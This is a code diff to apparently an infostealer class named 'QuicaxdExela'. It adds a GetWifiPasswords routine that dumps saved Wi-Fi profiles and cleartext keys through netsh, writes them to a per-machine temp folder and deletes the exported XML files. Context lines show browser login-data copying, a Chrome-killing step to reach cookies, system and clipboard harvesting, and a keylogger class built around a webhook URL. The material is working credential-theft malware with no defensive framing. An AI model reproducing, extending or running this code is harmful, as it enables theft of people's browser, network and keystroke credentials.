@@ -196,7 +196,7 @@ class QuicaxdExela:
                     shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 except:
                     try:
-                        subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
+                        #subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
                         time.sleep(1.5)
                         shutil.copy2(self.login_data_path, self.backup_login_data_path)
                     except:
@@ -811,6 +811,57 @@ class QuicaxdExela:
                 f.write(f"   Free Space: {disk['Free Space']:.2f} GB\n")
                 f.write(f"   Usage Percentage: {disk['Usage Percentage']}%\n\n")
                 f.write(f"Full System Information\n{output}")
+    def GetWifiPasswords(self, path:str):
+        pathxd = os.path.join(path, "Wifi.txt")
+        try:
+            command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode(errors="ignore")
+            wifi_files = []
+            for filename in os.listdir(os.getcwd()):
+                if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
+                    wifi_files.append(filename)
+            for i in wifi_files:
+                with open(i, 'r') as f:
+                    name_counter = 0
+                    wifi_name = ""
+                    wifi_password = ""
+                    creds = []
+                    for line in f.readlines():
+                        if "name" in line and name_counter == 0:
+                            name_counter += 1
+                            stripped = line.strip()
+                            front = stripped[6:]
+                            back = front[:-7]
+                            wifi_name = back
+                        if "keyMaterial" in line:
+                            stripped = line.strip()
+                            front = stripped[13:]
+                            back = front[:-14]
+                            wifi_password = back
+                if wifi_password == "":
+                    wifi_password = "none"
+                creds = [wifi_name, wifi_password]
+                with open(pathxd, 'a', encoding="utf-8", errors="ignore") as f:
+                    f.write("\n[*] Wifi Name: " + creds[0] + "\n" + "[+] Wifi Password: " + creds[1] + "\n")
+                    f.close()
+                # Delete created files
+            for y in wifi_files:
+                os.remove(y)
+            wifi_profiles = []
+            wifi_passwords = dict()
+            command = subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines()
+            for line in command:
+                if 'All User Profile' in line:
+                    name= line[(line.find(':') + 1):].strip()
+                    wifi_profiles.append(name)
+                for profile in wifi_profiles:
+                    for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
+                        if 'Key Content' in line:
+                            wifi_passwords[profile] = line[(line.find(':') + 1):].strip()    
+            with open(pathxd, "a", errors="ignore", encoding="utf-8") as data:
+                for profile, password in wifi_passwords.items():
+                    data.write(f"WiFi Profile: {profile}\nPassword: {password}\n\n")
+        except Exception as asd:
+            print(str(asd))
     def writeAllData(self):    
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
@@ -917,6 +968,8 @@ class QuicaxdExela:
                 self.get_last_clipboard_image(run)        
             if 45 > 3:
                 self.get_all_system_data()
+            if 7855 < 8888:
+                self.GetWifiPasswords(tmp + f"\\{run}")
         else:
             os.mkdir(tmp + f"\\{run}")
             if not self.passws == 0:
@@ -1017,6 +1070,8 @@ class QuicaxdExela:
                 self.get_last_clipboard_image(run)
             if 45 > 3:
                 self.get_all_system_data()
+            if 7855 < 8888:
+                self.GetWifiPasswords(tmp + f"\\{run}")
 class KeyboardLogger:
     def __init__(self, output_file, webhook_url) -> None:
         self.output_file = output_file
